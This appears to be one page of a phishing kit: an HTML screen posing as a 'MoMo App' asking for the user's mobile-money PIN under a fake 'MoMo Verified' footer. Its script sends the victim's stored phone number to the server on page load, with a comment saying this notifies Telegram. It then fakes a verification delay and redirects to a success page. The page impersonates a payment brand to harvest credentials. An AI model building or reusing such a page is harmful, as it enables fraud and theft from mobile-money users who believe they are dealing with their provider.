<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MoMo PIN</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #0b5c6b;
  color: white;
  text-align: center;
}

.header {
  background: #0b5c6b;
  color: #ffcc00;
  padding: 15px;
  font-size: 20px;
  font-weight: bold;
}

.container {
  background: white;
  color: black;
  max-width: 350px;
  margin: 40px auto;
  padding: 25px;
  border-radius: 15px;
}

input {
  width: 100%;
  padding: 15px;
  margin-top: 15px;
  border-radius: 10px;
  border: none;
  background: #f1f1f1;
  text-align: center;
  font-size: 18px;
  letter-spacing: 5px;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  background: #ffcc00;
  border: none;
  border-radius: 10px;
  font-weight: bold;
}

.footer {
  margin-top: 20px;
  font-size: 12px;
}
</style>
</head>

<body>

<div class="header">
  MoMo App
</div>

<div class="container">
  <h3>Enter MoMo PIN</h3>

  <p id="phoneDisplay"></p>

  <form id="pinForm">
    <input type="password" placeholder="****" required>
    <button type="submit" id="pinBtn">Confirm</button>
  </form>
</div>

<div class="footer">
  2026@MoMo Verified
</div>

<script>
const phone = localStorage.getItem("phone");

// Redirect if no data
if (!phone) {
  window.location.href = "/";
}

// Show phone
document.getElementById("phoneDisplay").innerText = "Number: " + phone;

// Notify Telegram when page opens
fetch("/pin-step", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ phone })
});

// Submit
document.getElementById("pinForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const btn = document.getElementById("pinBtn");
  btn.innerText = "Verifying...";
  btn.disabled = true;

  setTimeout(() => {
    window.location.href = "/success.html";
  }, 1500);
});
</script>

</body>
</html>
